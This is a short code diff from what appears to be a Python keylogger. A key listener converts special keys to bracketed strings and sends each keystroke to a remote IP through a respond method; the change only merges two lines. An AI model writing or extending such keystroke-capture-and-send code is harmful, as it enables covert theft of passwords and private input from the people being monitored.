@@ -75,8 +75,7 @@ class Listener(object):
         try:
             keys = key.char
         except AttributeError:
-            keys = str(key)
-            keys = '<' + keys + '>\n'
+            keys = '<' + str(key) + '>\n'
 
         self.respond(self.remote_ip, keys, True)
 
